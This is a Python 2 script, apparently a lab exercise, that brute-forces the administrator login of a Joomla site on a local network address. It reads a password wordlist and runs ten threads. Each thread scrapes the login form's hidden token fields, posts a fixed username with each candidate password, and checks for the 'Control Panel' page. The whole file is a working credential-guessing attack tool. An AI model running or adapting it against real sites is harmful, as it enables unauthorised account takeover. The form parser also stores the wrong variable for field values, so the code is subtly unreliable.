'''
http://localhost:8888/mysite
Check form in module mod_login of joomla
https://docs.python.org/2/library/cookielib.html
'''

import threading
import cookielib # cookie handler for http clients
import urllib2
import urllib
from HTMLParser import HTMLParser
from utils.wordList import build_wordlist

user_thread = 10
username = "esther"
wordlist_file = "/Users/evega/Documents/cice/pruebas/best110.txt"
resume = None

# target specific settings
# form and php action target could be in different urls
target_url = "http://192.168.1.52:8888/mysite/administrator/index.php"
target_post = "http://192.168.1.52:8888/mysite/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Control Panel"

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results={}

    # There are three primary methods you can implement when using this parser
    # handle_starttag (self, tag, attrs)
    # handle_endtag (self, tag)
    # handle_data (self, data)
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print "Finished settings up for: %s" % username

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        # while we havent found it, and we still have passwords to try
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()

            #cookies!!! --> Set up our cookie JAR!
            jar = cookielib.FileCookieJar("cookies") # it will store the cookies in the "cookies" file
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()

            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page) # returns a dictionary of all the retrieved form elements

            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit...."


words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()